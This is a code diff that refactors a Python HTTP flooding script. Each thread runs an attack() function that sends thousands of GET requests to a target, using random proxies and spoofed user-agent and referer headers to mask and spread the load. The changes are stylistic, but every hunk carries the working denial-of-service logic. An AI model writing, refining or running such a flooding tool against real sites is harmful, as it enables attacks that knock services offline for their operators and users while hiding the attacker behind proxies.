@@ -43,10 +43,7 @@ if not args.target or not args.n:
     parser.print_help()
     quit()
 
-if 'http' not in args.target:
-    target = 'http://' + args.target
-else:
-    target = args.target
+target = f'http://{args.target}' if 'http' not in args.target else args.target
 n = args.n
 
 user_agents = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991',
@@ -93,13 +90,10 @@ proxies = proxify.many()
 
 def attack():
     global proxies, turns
-    for x in range(1, 9999):
+    for _ in range(1, 9999):
         try:
             proxy_o = random.choice(proxies)
-            if 'https' in proxy_o:
-                proxy = {'https': proxy_o}
-            else:
-                proxy = {'http': proxy_o}
+            proxy = {'https': proxy_o} if 'https' in proxy_o else {'http': proxy_o}
             headers = {'User-Agent': random.choice(user_agents), 'Connection': 'keep-alive',
             'Keep-Alive': str(random.choice(range(110,120))), 'Referer': random.choice(referers)}
             requests.get(target + path, verify=False, stream=True, proxies=proxy)
@@ -116,7 +110,7 @@ def attack():
 
 threads = []
 
-for i in range(1, n):
+for _ in range(1, n):
     task = threading.Thread(target=attack, args=())
     threads.append(task)
 
